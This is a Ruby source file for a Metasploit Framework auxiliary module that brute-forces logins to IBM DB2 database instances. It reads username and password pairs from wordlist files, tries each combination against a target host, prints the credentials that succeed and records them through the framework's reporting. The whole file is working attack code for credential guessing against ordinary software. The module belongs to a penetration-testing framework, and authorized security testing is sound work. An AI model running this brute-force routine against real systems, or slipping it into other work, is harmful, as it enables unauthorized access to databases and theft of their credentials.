##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary
        
	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::DB2
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report
	
	def initialize
		super(
			'Name'           => 'DB2 Authentication Brute Force Utility',
			'Version'        => '$Revision$',
			'Description'    => %q{This module attempts to authenticate against a DB2
				instance using username and password combinations indicated by the
				USER_FILE, PASS_FILE, and USERPASS_FILE options.},
			'Author'         => ['todb'],
			'License'        => MSF_LICENSE
		)
		register_options(
			[
				OptBool.new('VERBOSE', [ true, 'Verbose output', false]),
				OptPath.new('USERPASS_FILE',  [ false, "File containing (space-seperated) users and passwords, one pair per line", File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_userpass.txt") ]),
				OptPath.new('USER_FILE',  [ false, "File containing users, one per line", File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_user.txt") ]),
				OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line", File.join(Msf::Config.install_root, "data", "wordlists", "db2_default_pass.txt") ]),
			], self.class)

		# Users must use user/pass/userpass files.
		deregister_options('USERNAME' , 'PASSWORD')
	end

	def run_host(ip)
		tried_combos = []
		last_response = nil
			each_user_pass { |user, pass|
				# Stash these in the datastore.
				datastore['USERNAME'] = user
				datastore['PASSWORD'] = pass
				# Don't bother if we've already tried this combination, or if the last time
				# we tried we got some kind of connection error. 
				if not(tried_combos.include?("#{user}:#{pass}") || [:done, :error].include?(last_response))
					last_response = do_login()
				else
					next
				end
				tried_combos << "#{user}:#{pass}"
			}
	end

	def do_login()
		user,pass,db,verbose = datastore['USERNAME'],datastore['PASSWORD'],datastore['DATABASE'],datastore['VERBOSE']
		print_status("Trying username:'#{user}' with password:'#{pass}' against #{rhost}:#{rport}") if verbose

		begin
			info = db2_check_login
		rescue ::Rex::ConnectionError
			print_error("#{rhost}:#{rport} : Unable to attempt authentication") if verbose 
			return :done
		rescue ::Rex::Proto::DRDA::RespError => e
			print_error("#{rhost}:#{rport} : Error in connecting to DB2 instance: #{e}") if verbose 
			return :error
		end
			disconnect
			if info[:db_login_success]
				print_good("#{rhost}:#{rport} [DB2] successful login for '#{user}' : '#{pass}' against database '#{db}'")
				report_auth_info(
					:host => rhost,
					:proto => 'db2',
					:user => user,
					:pass => pass,
					:targ_host => rhost,
					:targ_port => rport
				)
				return :next_user
			else
				print_status("#{rhost}:#{rport} [DB2] failed login for '#{user}' : '#{pass}' against database '#{db}'") if verbose
				return :fail
			end

	end
end
